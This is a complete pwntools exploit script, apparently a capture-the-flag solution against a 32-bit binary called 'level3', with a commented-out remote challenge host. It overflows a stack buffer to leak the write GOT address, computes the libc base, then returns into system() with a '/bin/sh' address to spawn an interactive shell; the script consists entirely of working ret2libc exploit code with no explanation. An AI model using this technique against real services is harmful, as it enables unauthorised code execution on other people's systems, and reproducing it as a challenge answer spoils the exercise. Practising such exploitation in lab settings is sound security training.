from pwn import *
context.log_level = 'debug'
context.terminal = ["tmux","splitw","-h"]
# p = remote("111.198.29.45",48359)
p = process('./level3')
# context.terminal = ['tmux','splitw','-h']
elf = ELF("./level3")
# libc = ELF("./libc_32.so.6")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
write_plt = elf.sym['write']
write_got = elf.got['write']
main_plt = elf.sym['main']
gdb.attach(p)
payload = 'a'*(0x88+4) + p32(write_plt) + p32(main_plt) + p32(1) + p32(write_got) + p32(4)
p.recvuntil("Input:\n")
p.send(payload)

write_got_addr = u32(p.recv(4))
print(hex(write_got_addr))

libc_base = write_got_addr - libc.sym['write']
system_addr = libc_base + libc.sym['system']
sh_addr = libc_base + 0x15ba0b

payload2 = 'a'*(0x88+4) + p32(system_addr) + p32(0xdeadbeef) + p32(sh_addr)
p.recvuntil("Input:\n")
p.send(payload2)

p.interactive()
